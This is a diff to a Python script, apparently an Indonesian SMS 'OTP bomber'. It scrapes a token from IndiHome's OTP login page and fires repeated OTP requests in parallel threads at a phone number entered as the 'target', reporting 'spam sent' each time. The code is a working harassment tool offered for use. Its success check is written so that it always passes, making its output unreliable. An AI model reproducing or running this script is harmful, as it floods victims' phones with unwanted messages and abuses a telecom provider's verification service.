@@ -18,7 +18,7 @@ print(C+'Subscribe channel Ryuzora')
 sleep(2)
 print(K+'[ Opening'+M+' Youtube ]')
 sleep(1)
-os.system('xdg-open https://www.youtube.com/c/Ryu>
+os.system('xdg-open https://www.youtube.com/c/RyuzsanYT')
 os.system('clear')
 sleep(1.3)
 
@@ -39,9 +39,9 @@ def gas(no):
 
 def gas(no):
         s = requests.Session()
-        url = "https://www.indihome.co.id/verifik>
+        url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
         req = s.get(url).text
-        token = re.findall(r"name=\"_token\" valu>
+        token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]
 
         data = {
         "_token":token,
@@ -54,15 +54,15 @@ def gas(no):
         
 def main(cnt, no):
         jml = 0
-        with ThreadPoolExecutor(max_workers=2) as>
+        with ThreadPoolExecutor(max_workers=2) as e:
                 futures = []
                 for x in range(int(cnt)):
-                        futures.append(e.submit(g>
-                for i, future in enumerate(future>
+                        futures.append(e.submit(gas, no))
+                for i, future in enumerate(futures):
                         jml += 1
                         spam = future.result()
-                        if "Gagal!" or "dikirim" >
-                                print(f"[{jml}] \>
+                        if "Gagal!" or "dikirim" in spam:
+                                print(f"[{jml}] \033[1;33mSpam telah terkirim ke {no}")
                         else:
                                 print("* ERROR *")
                                 sys.exit()
@@ -72,7 +72,7 @@ print("")
 
 if __name__ == '__main__':
         try:
-                helloi = input(K+'Tap enter to co>
+                helloi = input(K+'Tap enter to continue')
                 print("""\033[1m
 \033[1;95m╔═════════════════════════╗
 \033[1;95m║         Script          ║
@@ -81,20 +81,20 @@ if __name__ == '__main__':
 \033[1;95m╚═════════════════════════╝
         """)
 
-                no = input("\033[1;34mMasukan nom>
+                no = input("\033[1;34mMasukan nomor target (pakai 08)    : ")
                 if(no.isdigit()):
                         pass
                 else:
-                        print("Nomor telepon inva>
+                        print("Nomor telepon invalid!")
                         sys.exit()
 
                 if len(no) < 9:
-                        print("Nomor telepon kura>
+                        print("Nomor telepon kurang dari 9 digit!")
                         sys.exit()
                         
                 cnt = input("Jumlah pesan? : ")
                 if bool(cnt.isdigit()) == 0:
-                        print("Jumlah pesan tidak>
+                        print("Jumlah pesan tidak boleh nol")
                         sys.exit()
                 else:
                         print("")
